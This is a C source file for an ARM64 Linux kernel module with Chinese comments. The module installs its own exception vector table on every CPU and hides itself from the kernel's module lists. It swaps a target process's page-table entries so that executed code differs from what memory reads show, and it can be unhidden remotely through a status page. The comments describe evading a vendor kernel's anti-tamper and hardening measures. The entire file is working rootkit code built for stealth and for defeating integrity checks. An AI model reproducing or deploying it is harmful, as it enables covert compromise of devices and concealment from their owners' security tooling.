/*
 * caoin shadow v2e — 路线 3：幽灵 LKM + VBAR 全核广播 + 周期重广播 + PTE 2 态跷跷板
 *
 * 排除记录：
 *  - do_page_fault inline hook：folkpatch KP 有 text 反篡改（KP hook panic →
 *    干净重启无 ramoops），路线死刑（pstore 实证）
 *  - stop_machine：folkpatch 内核次核不响应 stop IPI → 硬锁 → 看门狗复位
 *  - tlbi vae1is：只刷当前 ASID（本模块 ASID ≠ 目标 ASID）→ 必须 vaae1is
 *  - VBAR per-CPU：单核 msr 不够 → on_each_cpu 广播
 *
 * v2e 组合：
 *  - VBAR 全核广播（on_each_cpu，地址经 cfg 注入）+ unhide tick 每秒重广播
 *    （覆盖 cpuidle 恢复窗口；目标核建议绑核 + 禁 cpuidle，用户态操作零内核改）
 *  - PTE 2 态跷跷板：SHADOW(--x, 桩) ↔ ORIG(r--, UXN)——数据 abort 非写 → ORIG；
 *    取指 abort → SHADOW。fault 驱动，无 eret 死循环
 *  - 幽灵模块：自隐藏（kobject_del + list_del）+ status 页远控解隐藏 + fail-safe
 *  - 自研 extable 安全读写（不用 probe_kernel_read，绕开 hardened usercopy）
 *
 * 内核触碰面：PTE 读写 + VBAR 寄存器 + kobject_del/list_del——零 text patch。
 */

#include <linux/module.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/timer.h>
#include <asm/pgtable.h>

#undef PAGE_OFFSET
#define PAGE_OFFSET 0xffffffC000000000UL

#define CAOIN_CFG_MAGIC 0xCA03CA03CA03CA03ULL
#define CAOIN_CFG_MARKER 0xDEADCA03DEADCA03ULL

#define PTE_AP_MASK 0xC0UL

struct caoin_cfg {
    u64 marker, magic;
    u64 target_pid;
    u64 target_va;
    u64 shadow_phys;
    u64 expect_phys;
    u64 status_va;
    u64 find_task, probe_read, printk;
    u64 status_phys;
    u64 p_probe_write;
    u64 on_each_cpu;   /* on_each_cpu 地址（VBAR 全核广播用） */
    u64 shadow_va;     /* shadow 页 VA（模块自推导 shadow_phys 用） */
    u64 kobject_del;
    u64 t_init, t_mod, t_del;
    u64 jiffies_addr;
    u64 unused[1];
    /* 运行态 */
    u64 orig_pte;
    u64 mm_off, pgd_off;
    u64 pte_addr;
    u64 shadow_pte_val;
    u64 origview_pte_val;
    u64 cur_view;      /* 0=orig 1=shadow 2=stepping(未用) */
    u64 old_vbar;
    u64 vbar_on;
    u64 mm_run;
    u64 saved_prev;
    volatile u64 hidden;   /* 0=未隐藏 1=已隐藏 2=已挂回 */
};

static struct caoin_cfg caoin_cfg_block = {
    .marker = CAOIN_CFG_MARKER,
    .magic = 0,
};

static int (*caoin_printk)(const char *fmt, ...);
#define CK_LOG(...) do { if (caoin_printk) caoin_printk(__VA_ARGS__); } while (0)

/* ---- 自研 extable 安全读写 ---- */

static inline int caoin_rd64(unsigned long src, void *out)
{
    u64 val;
    int err;

    asm volatile(
    "1: ldr %0, [%2]\n"
    "   mov %w1, #0\n"
    "   b   3f\n"
    "2: mov %w1, #1\n"
    "3:\n"
    "   .pushsection __ex_table, \"a\"\n"
    "   .balign 4\n"
    "   .word 1b - ., 2b - .\n"
    "   .popsection\n"
    : "=r"(val), "=r"(err)
    : "r"(src)
    : "memory");
    *(u64 *)out = val;
    return err;
}

static inline int caoin_wr64(unsigned long dst, u64 val)
{
    int err;

    asm volatile(
    "1: str %1, [%2]\n"
    "   mov %w0, #0\n"
    "   b   3f\n"
    "2: mov %w0, #1\n"
    "3:\n"
    "   .pushsection __ex_table, \"a\"\n"
    "   .balign 4\n"
    "   .word 1b - ., 2b - .\n"
    "   .popsection\n"
    : "=r"(err)
    : "r"(val), "r"(dst)
    : "memory");
    return err;
}

/* ---- TLB（vaae1is：VA + 所有 ASID） ---- */

static void caoin_tlb_flush(unsigned long va)
{
    unsigned long addr = va >> 12;
    asm volatile("dsb ish" ::: "memory");
    asm volatile("tlbi vaae1is, %0" :: "r"(addr));
    asm volatile("isb" ::: "memory");
}

/* ---- 探测引擎 ---- */

static int caoin_probe_walk(unsigned long mm_cand, unsigned long pgd_off_cand,
                            unsigned long va, unsigned long expect_phys,
                            unsigned long *pte_a_out)
{
    unsigned long pgd_p, e0, e2, pte_v, pte_a;
    const unsigned long m = PHYS_MASK & PAGE_MASK;

    if (caoin_rd64(mm_cand + pgd_off_cand, &pgd_p))
        return 0;
    if (pgd_p < PAGE_OFFSET || (pgd_p & 0xFFF))
        return 0;
    if (caoin_rd64(pgd_p + ((va >> 30) & 0x1FF) * 8, &e0))
        return 0;
    if (!(e0 & m))
        return 0;
    if (caoin_rd64(__va((e0 & m) + ((va >> 21) & 0x1FF) * 8), &e2))
        return 0;
    if (!(e2 & m))
        return 0;
    pte_a = (unsigned long)__va((e2 & m) + ((va >> 12) & 0x1FF) * 8);
    if (caoin_rd64(pte_a, &pte_v))
        return 0;
    if (expect_phys && (pte_v & m) != expect_phys)
        return 0;
    if (pte_a_out)
        *pte_a_out = pte_a;
    return 1;
}

#define CAOIN_SHADOW_MAGIC 0xCA0FCA0FCA0FCA0FULL

/* 定位判据（pagemap PFN 被 folkpatch 封死后不再依赖用户态给 phys）：
 * 同一 mm 的三页均可 walk（target/status/shadow）且 shadow 页首含魔数。
 * shadow_phys / code_phys 由 init 从 PTE 自行推导。 */
static int caoin_locate(unsigned long task, unsigned long va,
                        unsigned long shadow_va, unsigned long va2,
                        unsigned long *mm_off_out, unsigned long *pgd_off_out,
                        unsigned long *mm_out, unsigned long *pte_a_out)
{
    unsigned long mm_c, pgd_p, moff, poff, pte_a2 = 0, pte_a3 = 0, pv3;
    const unsigned long m = PHYS_MASK & PAGE_MASK;
    for (moff = 0; moff < 0x1800; moff += 8) {
        if (caoin_rd64(task + moff, &mm_c))
            continue;
        if (mm_c < PAGE_OFFSET || (mm_c & 0x7))
            continue;
        for (poff = 0x20; poff < 0x400; poff += 8) {
            if (caoin_rd64(mm_c + poff, &pgd_p))
                continue;
            if (pgd_p < PAGE_OFFSET || (pgd_p & 0xFFF))
                continue;
            if (!caoin_probe_walk(mm_c, poff, va, 0, pte_a_out))
                continue;
            if (!caoin_probe_walk(mm_c, poff, va2, 0, &pte_a2))
                continue;
            if (!caoin_probe_walk(mm_c, poff, shadow_va, 0, &pte_a3))
                continue;
            if (caoin_rd64(pte_a3, &pv3))
                continue;
            {
                u64 magic = 0;
                if (caoin_rd64(__va((pv3 & m) + (shadow_va & ~PAGE_MASK)),
                               &magic))
                    continue;
                if (magic != CAOIN_SHADOW_MAGIC)
                    continue;
            }
            *mm_off_out = moff;
            *pgd_off_out = poff;
            if (mm_out)
                *mm_out = mm_c;
            return 1;
        }
    }
    return 0;
}

static void caoin_write_status2(unsigned long mm, unsigned long pgd_off,
                                unsigned long va, u64 val)
{
    unsigned long pte_a = 0, pte_v, phys;
    if (!caoin_probe_walk(mm, pgd_off, va, 0, &pte_a))
        return;
    if (caoin_rd64(pte_a, &pte_v))
        return;
    phys = pte_v & (PHYS_MASK & PAGE_MASK);
    caoin_wr64(__va(phys + (va & ~PAGE_MASK)), val);
    asm volatile("dsb ish" ::: "memory");
}

/* ---- PTE 翻转（KPTI 下双写：内核 pgd + user_pgd 副本） ---- */

static void caoin_flip(unsigned long pte_a, u64 val)
{
    set_pte((pte_t *)(unsigned long)pte_a, __pte((unsigned long)val));
}

static void caoin_flip_both(struct caoin_cfg *c, int view)
{
    u64 v1, v2 = 0;

    if (view == 1) {          /* SHADOW */
        v1 = c->shadow_pte_val;
        if (c->expect_phys)
            v2 = (c->status_phys & ~((PHYS_MASK & PAGE_MASK) | PTE_AP_MASK | (1UL << 54)))
               | (c->shadow_phys & (PHYS_MASK & PAGE_MASK)) | 0x80UL;
    } else if (view == 0) {   /* ORIG */
        v1 = c->origview_pte_val;
        if (c->expect_phys)
            v2 = (c->status_phys & ~(PTE_AP_MASK | (1UL << 54)))
               | 0x40UL | (1UL << 54);
    } else {                  /* RESTORE 原始 */
        v1 = c->orig_pte;
        if (c->expect_phys)
            v2 = c->status_phys;
    }
    caoin_flip(c->pte_addr, v1);
    if (c->expect_phys)
        caoin_flip(c->expect_phys, v2);
}

/* ---- VBAR 广播（per-CPU 寄存器；idle 恢复靠 tick 重广播兜底） ---- */

extern char caoin_vbar[];

static void caoin_vbar_set_on(void *info)
{
    asm volatile("msr vbar_el1, %0" :: "r"((unsigned long)caoin_vbar));
    asm volatile("isb" ::: "memory");
}

static void caoin_vbar_set_off(void *info)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    if (!c->old_vbar)
        return;
    asm volatile("msr vbar_el1, %0" :: "r"((unsigned long)c->old_vbar));
    asm volatile("isb" ::: "memory");
}

static void caoin_vbar_broadcast(int on)
{
    void (*oec)(void (*)(void *), void *, int) =
        (void (*)(void (*)(void *), void *, int))
        (unsigned long)caoin_cfg_block.on_each_cpu;
    if (oec)
        oec(on ? caoin_vbar_set_on : caoin_vbar_set_off, NULL, 1);
    else if (on)
        caoin_vbar_set_on(NULL);
    else
        caoin_vbar_set_off(NULL);
}

/* PTE 翻转后的 icache 维护：不失效则热循环命中陈旧行，永远到不了 fault */
static void caoin_ic_inval_one(void *info)
{
    asm volatile("ic iallu" ::: "memory");
    asm volatile("dsb ish" ::: "memory");
    asm volatile("isb" ::: "memory");
}

static void caoin_ic_inval(void)
{
    void (*oec)(void (*)(void *), void *, int) =
        (void (*)(void (*)(void *), void *, int))
        (unsigned long)caoin_cfg_block.on_each_cpu;
    if (oec)
        oec(caoin_ic_inval_one, NULL, 1);
    else
        caoin_ic_inval_one(NULL);
}

/* ---- 自隐藏 / 解隐藏（tick 兼作 VBAR 重广播） ---- */

#define CAOIN_UNHIDE_CMD  0xCA0F0001ULL
#define CAOIN_UNHIDE_ACK  0xCA0F0002ULL

static struct timer_list caoin_unhide_timer;
static void (*caoin_tinit)(void *, unsigned int, const char *, void *);
static int (*caoin_tmod)(void *, unsigned long);
static int (*caoin_tdel)(void *);
static volatile unsigned long *caoin_jp;

static void caoin_relist(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    c->hidden = 2;
    list_add(&THIS_MODULE->list,
             (struct list_head *)(unsigned long)c->saved_prev);
    CK_LOG("caoin2e: relisted\n");
}

static void caoin_unhide_tick(unsigned long arg)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long pte_a = 0, pte_v;
    u64 cmd = 0, *slot;
    static u64 walk_fail_cnt;
    static u64 tick_n;

    /* 前 3 次 tick 全程打印：定位 tick 内崩溃点 */
    if (tick_n < 3)
        CK_LOG("caoin2e: tick#%llu enter (rb=%lu h=%lu)\n",
               tick_n, c->unused[0] & 1, c->hidden);
    tick_n++;

    /* VBAR 重广播：覆盖 cpuidle 恢复窗口（每秒一次，微秒级）
     * cfg.unused[0] bit0 = 使能（隔离实验开关） */
    if (c->vbar_on && (c->unused[0] & 1)) {
        caoin_vbar_broadcast(1);
        if (tick_n < 4)
            CK_LOG("caoin2e: tick#%llu rebroadcast done\n", tick_n - 1);
    }

    if (c->hidden != 1 || !c->mm_run)
        goto out;
    if (caoin_probe_walk(c->mm_run, c->pgd_off,
                         (unsigned long)c->status_va, 0, &pte_a)
        && !caoin_rd64(pte_a, &pte_v)) {
        walk_fail_cnt = 0;
        slot = (u64 *)__va((pte_v & (PHYS_MASK & PAGE_MASK)) +
                           ((unsigned long)c->status_va & ~PAGE_MASK));
        if (!caoin_rd64((unsigned long)slot, &cmd)) {
            if (cmd == CAOIN_UNHIDE_CMD) {
                caoin_relist();
                caoin_write_status2(c->mm_run, c->pgd_off,
                                    (unsigned long)c->status_va,
                                    CAOIN_UNHIDE_ACK);
            }
        }
    } else {
        /* fail-safe：目标死亡 → walk 连续失败 → 自动挂回可卸载 */
        if (c->hidden == 1 && ++walk_fail_cnt > 30) {
            CK_LOG("caoin2e: walk fail x%llu, fail-safe relist\n",
                   (unsigned long long)walk_fail_cnt);
            caoin_relist();
        }
    }
out:
    if (caoin_tmod && caoin_jp)
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
}

/* ---- fault 过滤器（2 态跷跷板） ---- */

int caoin_fault_check(unsigned long addr, unsigned long pc,
                      unsigned int esr, unsigned long *spsr_p)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned int ec = esr >> 26;

    /* 取证：前 30 次调用全记录 */
    {
        static u64 flt_n;
        if (flt_n < 30)
            CK_LOG("caoin2e: flt#%llu v=%lu ec=%x dfsc=%x pc=%lx far=%lx\n",
                   flt_n, c->cur_view, ec, esr & 0x3f, pc, addr);
        flt_n++;
    }

    if ((addr >> 12) != ((unsigned long)c->target_va >> 12))
        return 0;

    if (c->cur_view == 1) {   /* SHADOW：数据读 fault → 切 ORIG */
        if (ec != 0x24 || (esr & (1 << 6)))
            return 0;      /* 非读 fault：放行 */
        caoin_flip_both(c, 0);
        c->cur_view = 0;
        caoin_tlb_flush((unsigned long)c->target_va);
        caoin_ic_inval();
        return 1;
    }
    if (c->cur_view == 0) {   /* ORIG：取指 fault → 切 SHADOW */
        if (ec != 0x20)
            return 0;
        caoin_flip_both(c, 1);
        c->cur_view = 1;
        caoin_tlb_flush((unsigned long)c->target_va);
        caoin_ic_inval();
        return 1;
    }
    return 0;
}

/* ---- 向量表与入口（v2b 验证版） ---- */

volatile unsigned long caoin_slot_tab[16];
volatile unsigned long caoin_old_el0_sync;

#define CAOIN_PASS(N)                                   \
"caoin_p" #N ":\n"                                      \
"    stp x16, x17, [sp, #-16]!\n"                       \
"    ldr x16, =caoin_slot_tab\n"                        \
"    ldr x16, [x16, #" #N "*8]\n"                       \
"    ldr x17, [sp, #8]\n"                               \
"    add sp, sp, #16\n"                                 \
"    br x16\n"

asm(
".balign 2048\n"
".global caoin_vbar\n"
"caoin_vbar:\n"
"    b caoin_p0\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p1\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p2\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p3\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p4\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p5\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p6\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p7\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_el0_entry\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p9\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p10\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p11\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p12\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p13\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p14\n"
"    .rept 31\n nop\n .endr\n"
"    b caoin_p15\n"
"    .rept 31\n nop\n .endr\n"
CAOIN_PASS(0) CAOIN_PASS(1) CAOIN_PASS(2) CAOIN_PASS(3)
CAOIN_PASS(4) CAOIN_PASS(5) CAOIN_PASS(6) CAOIN_PASS(7)
CAOIN_PASS(9) CAOIN_PASS(10) CAOIN_PASS(11) CAOIN_PASS(12)
CAOIN_PASS(13) CAOIN_PASS(14) CAOIN_PASS(15)
);

extern char caoin_vbar[];

asm(
".global caoin_el0_entry\n"
"caoin_el0_entry:\n"
"    stp x29, x30, [sp, #-256]!\n"
"    mov x29, sp\n"
"    stp x0, x1, [sp, #16]\n"
"    stp x2, x3, [sp, #32]\n"
"    stp x4, x5, [sp, #48]\n"
"    stp x6, x7, [sp, #64]\n"
"    stp x8, x9, [sp, #80]\n"
"    stp x10, x11, [sp, #96]\n"
"    stp x12, x13, [sp, #112]\n"
"    stp x14, x15, [sp, #128]\n"
"    stp x16, x17, [sp, #144]\n"
"    stp x18, xzr, [sp, #160]\n"
"    mrs x0, far_el1\n"
"    mrs x1, elr_el1\n"
"    mrs x2, esr_el1\n"
"    mov x3, xzr\n"
"    bl caoin_fault_check\n"
"    cbnz w0, 2f\n"
"    ldp x0, x1, [sp, #16]\n"
"    ldp x2, x3, [sp, #32]\n"
"    ldp x4, x5, [sp, #48]\n"
"    ldp x6, x7, [sp, #64]\n"
"    ldp x8, x9, [sp, #80]\n"
"    ldp x10, x11, [sp, #96]\n"
"    ldp x12, x13, [sp, #112]\n"
"    ldp x14, x15, [sp, #128]\n"
"    ldp x16, x17, [sp, #144]\n"
"    ldp x18, xzr, [sp, #160]\n"
"    ldp x29, x30, [sp], #256\n"
"    ldr x17, =caoin_old_el0_sync\n"
"    br x17\n"
"2:\n"
"    ldp x0, x1, [sp, #16]\n"
"    ldp x2, x3, [sp, #32]\n"
"    ldp x4, x5, [sp, #48]\n"
"    ldp x6, x7, [sp, #64]\n"
"    ldp x8, x9, [sp, #80]\n"
"    ldp x10, x11, [sp, #96]\n"
"    ldp x12, x13, [sp, #112]\n"
"    ldp x14, x15, [sp, #128]\n"
"    ldp x16, x17, [sp, #144]\n"
"    ldp x18, xzr, [sp, #160]\n"
"    ldp x29, x30, [sp], #256\n"
"    eret\n"
".align 3\n"
);

/* ---- init / exit ---- */

static int __init caoin_init(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;
    unsigned long mm_off, pgd_off, mmv, pte_a, orig_pte_v;
    unsigned long old_vbar, *tab = (unsigned long *)caoin_slot_tab;
    struct task_struct *(*find_task)(int);
    struct task_struct *task;
    int i;

    if (c->magic != CAOIN_CFG_MAGIC || !c->find_task || !c->on_each_cpu)
        return -EINVAL;

    caoin_printk = (void *)(unsigned long)c->printk;
    CK_LOG("caoin2e: init enter pid=%llu\n", (unsigned long long)c->target_pid);
    find_task = (void *)(unsigned long)c->find_task;
    task = find_task((int)c->target_pid);
    if (!task)
        return -ESRCH;

    if (!caoin_locate((unsigned long)task, (unsigned long)c->target_va,
                      (unsigned long)c->shadow_va,
                      (unsigned long)c->status_va,
                      &mm_off, &pgd_off, &mmv, &pte_a))
        return -ENOENT;
    c->mm_off = mm_off;
    c->pgd_off = pgd_off;
    c->pte_addr = pte_a;
    c->mm_run = mmv;
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x5);
    CK_LOG("caoin2e: combo locked mm=%lx pgd=%lx pte=%lx\n", mm_off, pgd_off, pte_a);

    /* 从 PTE 自推导 shadow_phys（用户态 pagemap PFN 已被封） */
    {
        unsigned long spte = 0, spv;
        if (!caoin_probe_walk(mmv, pgd_off, (unsigned long)c->shadow_va, 0, &spte)
            || caoin_rd64(spte, &spv))
            return -ENOENT;
        c->shadow_phys = spv & (PHYS_MASK & PAGE_MASK);
        CK_LOG("caoin2e: shadow_phys=%lx\n", (unsigned long)c->shadow_phys);
    }

    if (caoin_rd64(pte_a, &orig_pte_v))
        return -ENOENT;
    c->orig_pte = orig_pte_v;

    /* ---- KPTI：定位 user_pgd 并求 EL0 实际使用的 PTE ----
     * CONFIG_UNMAP_KERNEL_AT_EL0 下 EL0 走 mm->context.user_pgd（独立副本），
     * 只翻 mm->pgd 的 PTE 对 EL0 无效（实测 flt#=0 的根因）。
     * 扫描 mm->context 区找第二个 pgd 指针：walk 同 VA 得到独立 pte_addr。
     * 复用 expect_phys 槽作 pte_addr2（运行态）。 */
    c->expect_phys = 0;   /* 复用为 pte_addr2（EL0 实际 PTE） */
    c->status_phys = 0;   /* 复用为 orig_pte2 */
    {
        /* 诊断：mm 结构头部原始内容（0x00-0xff） */
        unsigned long dq[4];
        int r_, k_;
        for (r_ = 0; r_ < 4; r_++) {
            for (k_ = 0; k_ < 4; k_++)
                caoin_rd64(mmv + (unsigned long)(r_ * 32 + k_ * 8), &dq[k_]);
            CK_LOG("caoin2e: mm[%02x]=%lx %lx %lx %lx\n", r_ * 32,
                   dq[0], dq[1], dq[2], dq[3]);
        }
    }
    {
        unsigned long off, upgd, uptea = 0, uppte;
        const unsigned long m = PHYS_MASK & PAGE_MASK;
        /* 单点测试：mm+0x48（locate 确认过的 pgd 字段） */
        {
            unsigned long pgdval = 0, u48 = 0;
            caoin_rd64(mmv + 0x48, &pgdval);
            CK_LOG("caoin2e: scan0x48 pgdval=%lx\n", pgdval);
            if (caoin_probe_walk(mmv + 0x48, 0, (unsigned long)c->target_va, 0, &u48))
                CK_LOG("caoin2e: scan0x48 walk ok uptea=%lx pte_a=%lx\n", u48, pte_a);
            else
                CK_LOG("caoin2e: scan0x48 walk FAIL\n");
        }
        for (off = 0x40; off < 0x800; off += 8) {
            if (caoin_rd64(mmv + off, &upgd))
                continue;
            if (upgd < PAGE_OFFSET || (upgd & 0xFFF))
                continue;
            if (off == 0x48)
                CK_LOG("caoin2e: loop0x48 enter upgd=%lx\n", upgd);
            if (!caoin_probe_walk(mmv + off, 0, (unsigned long)c->target_va, 0, &uptea)) {
                if (off == 0x48)
                    CK_LOG("caoin2e: loop0x48 walk fail\n");
                continue;
            }
            if (off == 0x48)
                CK_LOG("caoin2e: loop0x48 walk ok uptea=%lx pte_a=%lx uppte_r=%lx orig=%lx\n",
                       uptea, pte_a, ({ unsigned long t_ = 0; caoin_rd64(uptea, &t_); t_; }),
                       orig_pte_v);
            if (!caoin_probe_walk(mmv + off, 0, (unsigned long)c->target_va, 0, &uptea))
                continue;
            if (!caoin_rd64(uptea, &uppte))
                continue;
            if ((uppte & m) != (orig_pte_v & m))
                continue;   /* 物理页必须一致（同一用户页） */
            if (uptea == pte_a) {
                /* 共享 L3：记日志不启用（说明翻转本应生效） */
                CK_LOG("caoin2e: pgd-like@%lx shares pte (kpti copy?)\n", mmv + off);
                continue;
            }
            c->expect_phys = uptea;
            c->status_phys = uppte;
            CK_LOG("caoin2e: user_pgd@%lx pte2=%lx\n", mmv + off, uptea);
            break;
        }
        if (!c->expect_phys)
            CK_LOG("caoin2e: user_pgd NOT found\n");
    }

    c->shadow_pte_val = (orig_pte_v & ~((PHYS_MASK & PAGE_MASK) | PTE_AP_MASK | (1UL << 54)))
                      | ((unsigned long)c->shadow_phys & (PHYS_MASK & PAGE_MASK))
                      | 0x80UL;                 /* AP=10: EL0 数据访问 fault */
    c->origview_pte_val = (orig_pte_v & ~(PTE_AP_MASK | (1UL << 54)))
                        | 0x40UL | (1UL << 54); /* AP=01 RO, UXN=1 */

    /* VBAR 广播（旧表快照先存） */
    asm volatile("mrs %0, vbar_el1" : "=r"(old_vbar));
    c->old_vbar = old_vbar;
    for (i = 0; i < 16; i++)
        tab[i] = old_vbar + i * 0x80;
    caoin_old_el0_sync = old_vbar + 0x400;
    caoin_vbar_broadcast(1);
    c->vbar_on = 1;
    CK_LOG("caoin2e: vbar on (%lx -> %lx)\n", old_vbar, (unsigned long)caoin_vbar);

    /* 切 shadow 视图（icache 必须同步失效，否则热循环命中陈旧行） */
    caoin_flip_both(c, 1);
    {
        /* 回读验证：翻转是否贴住（内核 pgd + user_pgd 两侧） */
        u64 chk = 0;
        caoin_rd64(c->pte_addr, &chk);
        CK_LOG("caoin2e: post-flip pte=%lx want=%lx\n",
               (unsigned long)chk, (unsigned long)c->shadow_pte_val);
        if (c->expect_phys) {
            u64 chk2 = 0, want2 = 0;
            caoin_rd64(c->expect_phys, &chk2);
            want2 = (c->status_phys & ~((PHYS_MASK & PAGE_MASK) | PTE_AP_MASK | (1UL << 54)))
                  | (c->shadow_phys & (PHYS_MASK & PAGE_MASK)) | 0x80UL;
            CK_LOG("caoin2e: post-flip pte2=%lx want=%lx\n",
                   (unsigned long)chk2, (unsigned long)want2);
        }
    }
    c->cur_view = 1;
    caoin_tlb_flush((unsigned long)c->target_va);
    caoin_ic_inval();
    caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x7);
    CK_LOG("caoin2e: on\n");

    /* 自隐藏（cfg.unused[0] bit1 = 使能，隔离实验开关）
     * 每个动作前后主动打印：重启后 pstore 最后一行 = 崩溃点 */
    if (!(c->unused[0] & 2))
        goto skip_hide;
    if (c->kobject_del && c->t_init && c->t_mod && c->t_del && c->jiffies_addr) {
        void (*kdel)(void *) = (void *)(unsigned long)c->kobject_del;
        caoin_tinit = (void *)(unsigned long)c->t_init;
        caoin_tmod = (void *)(unsigned long)c->t_mod;
        caoin_tdel = (void *)(unsigned long)c->t_del;
        caoin_jp = (volatile unsigned long *)(unsigned long)c->jiffies_addr;
        c->saved_prev = (u64)(unsigned long)THIS_MODULE->list.prev;
        CK_LOG("caoin2e: h1 prev=%lx\n", (unsigned long)c->saved_prev);
        kdel(&THIS_MODULE->mkobj.kobj);
        CK_LOG("caoin2e: h2 kdel done\n");
        list_del(&THIS_MODULE->list);
        CK_LOG("caoin2e: h3 list_del done\n");
        c->hidden = 1;
        caoin_tinit(&caoin_unhide_timer, 0, 0, 0);
        CK_LOG("caoin2e: h4 tinit done\n");
        caoin_unhide_timer.function = caoin_unhide_tick;
        caoin_tmod(&caoin_unhide_timer, *caoin_jp + HZ);
        CK_LOG("caoin2e: h5 tmod done, armed\n");
        caoin_write_status2(mmv, pgd_off, (unsigned long)c->status_va, 0x8);
        CK_LOG("caoin2e: h6 status8 done\n");
    }
skip_hide:
    return 0;
}

static void __exit caoin_exit(void)
{
    struct caoin_cfg *c = &caoin_cfg_block;

    if (caoin_tdel)
        caoin_tdel(&caoin_unhide_timer);
    if (c->magic != CAOIN_CFG_MAGIC || !c->pte_addr)
        return;
    if (c->vbar_on) {
        c->vbar_on = 0;
        caoin_vbar_broadcast(0);
    }
    /* 恢复原 PTE（KPTI 双副本都恢复；status_phys 槽此时仍是 orig_pte2） */
    caoin_flip_both(c, 2);
    c->cur_view = 0;
    caoin_tlb_flush((unsigned long)c->target_va);
    if (c->mm_run)
        caoin_write_status2(c->mm_run, c->pgd_off,
                            (unsigned long)c->status_va, 0xF);
    CK_LOG("caoin2e: off\n");
}

module_init(caoin_init);
module_exit(caoin_exit);
